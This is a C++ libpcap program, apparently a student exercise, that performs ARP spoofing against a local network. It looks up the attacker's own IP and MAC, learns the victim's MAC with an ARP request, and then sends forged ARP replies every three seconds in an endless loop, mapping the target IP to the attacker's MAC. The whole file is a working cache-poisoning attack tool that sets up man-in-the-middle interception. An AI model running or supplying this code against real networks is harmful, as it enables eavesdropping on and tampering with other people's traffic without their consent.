#include <iostream>
#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include "protocol_structure.h"

using namespace std;

#define ETHER_HEADER_SIZE  14
#define ARP_HEADER_SIZE 28

void GET_MY_IP_MAC(char * dev, uint8_t * ip_attacker, uint8_t * mac_attacker)
{
    /*        Get my IP Address      */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr); // ???????

    close(fd);
    memcpy(ip_attacker, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);
/*************************************************************************************************/

    // MAC 주소 가져오는 부분인데 공부 해야 할듯. 이해 불가

    /*        Get my Mac Address      */
    struct ifconf ifc;
    char buf[1024];
    bool success = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    ifreq* it = ifc.ifc_req;
    const ifreq* const end = it + (ifc.ifc_len / sizeof(ifreq));

    for (; it != end; ++it)
    {
      strcpy(ifr.ifr_name, it->ifr_name);
      if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
      {
              if (! (ifr.ifr_flags & IFF_LOOPBACK)) // don't count loopback
              {
                      if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                      {
                              success = true;
                              break;
                      }
              }
      }
      else { /* handle error */ }
    }
    if (success) memcpy(mac_attacker, ifr.ifr_hwaddr.sa_data, 6);
}



int main(int argc, char * argv[])
{

    if (argc != 4)
    {
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    const u_char * ARP_REQ_PACKET = (u_char*)malloc(sizeof(u_char) *(ETHER_HEADER_SIZE+ARP_HEADER_SIZE));
    ETH_header * eth_REQ = (ETH_header *)ARP_REQ_PACKET;
    ARP_header * arp_REQ = (ARP_header *)(ARP_REQ_PACKET+ETHER_HEADER_SIZE);
    uint8_t My_MAC[6];
    uint8_t My_IP[4];
    uint8_t Sender_MAC[6];
    uint8_t Sender_IP[4];
    uint8_t Target_IP[4];

    /*    Get Sender IP and Target IP    */
    char * Sender_IP_str = argv[2];
    char * Target_IP_str = argv[3];
    inet_pton(AF_INET, Sender_IP_str, Sender_IP);
    inet_pton(AF_INET, Target_IP_str, Target_IP);

    /*        Get my IP and Mac          */
    GET_MY_IP_MAC(dev, My_IP, My_MAC);

    /*      Make ARP Request Packet      */

    printf("----------------Let's Make ARP Request Packet-----------------\n");
    for(int j=0; j<6; j++)
        eth_REQ->dmac[j]=0xFF;
    memcpy(eth_REQ->smac, My_MAC, 6);
    eth_REQ->type = htons((0x08 << 8) | 0x06);

    arp_REQ->htype = htons((0x00 << 8) | 0x01);
    arp_REQ->ptype = htons((0x08 << 8) | 0x00);
    arp_REQ->hlen = 0x06;
    arp_REQ->plen = 0x04;
    arp_REQ->oper = htons((0x00 << 8) | 0x01);

    memcpy(arp_REQ->smac, My_MAC, 6);
    memcpy(arp_REQ->sip, My_IP, 4);
    for(int j=0; j<6; j++)
        arp_REQ->dmac[j] = 0x00;
    memcpy(arp_REQ->dip, Sender_IP, 4);

    /*************************************************************************************************/

    /*      Send ARP Request Packet and Get Sender MAC     */

    while (1)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        printf("send ARP Reply Packet...\n");
        pcap_sendpacket(handle, ARP_REQ_PACKET, ETHER_HEADER_SIZE+ARP_HEADER_SIZE);
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;


        ETH_header * eth_GET = (ETH_header *)packet;


        if(memcmp(eth_GET->dmac, My_MAC, 6) && ntohs(eth_GET->type) != 0x0806)
        {
            continue;
        }

        ARP_header * arp_GET = (ARP_header *)(packet+ETHER_HEADER_SIZE);

        if(ntohs(arp_GET->oper) != 0x0002)
        {
            continue;
        }

        memcpy(Sender_MAC, eth_GET->smac, 6);
        printf("----------------Success GET Sender MAC-----------------\n");
        break;
    }
    /*************************************************************************************************/


    /*      Make ARP Reply Packet      */

    printf("----------------Let's Make ARP Reply Packet-----------------\n");
    const u_char * ARP_REP_PACKET = (u_char*)malloc(sizeof(u_char) *(ETHER_HEADER_SIZE+ARP_HEADER_SIZE));
    ETH_header * eth_REP = (ETH_header *)ARP_REP_PACKET;
    ARP_header * arp_REP = (ARP_header *)(ARP_REP_PACKET+ETHER_HEADER_SIZE);
    memcpy(eth_REP->dmac, Sender_MAC, 6);
    memcpy(eth_REP->smac, My_MAC, 6);
    eth_REP->type = htons((0x08 << 8) | 0x06);

    arp_REP->htype = htons((0x00 << 8) | 0x01);
    arp_REP->ptype = htons((0x08 << 8) | 0x00);
    arp_REP->hlen = 0x06;
    arp_REP->plen = 0x04;
    arp_REP->oper = htons((0x00 << 8) | 0x02);

    memcpy(arp_REP->smac, My_MAC, 6);
    memcpy(arp_REP->sip, Target_IP, 4);
    memcpy(arp_REP->dmac, Sender_MAC, 6);
    memcpy(arp_REP->dip, Sender_IP, 4);

    /*************************************************************************************************/

    /*      Send ARP Reply Packet     */
    while(1)
    {
        printf("send ARP Reply Packet...\n");
        pcap_sendpacket(handle, ARP_REP_PACKET, ETHER_HEADER_SIZE+ARP_HEADER_SIZE);
        sleep(3);
    }
    /*************************************************************************************************/
    pcap_close(handle);

    return 0;

}
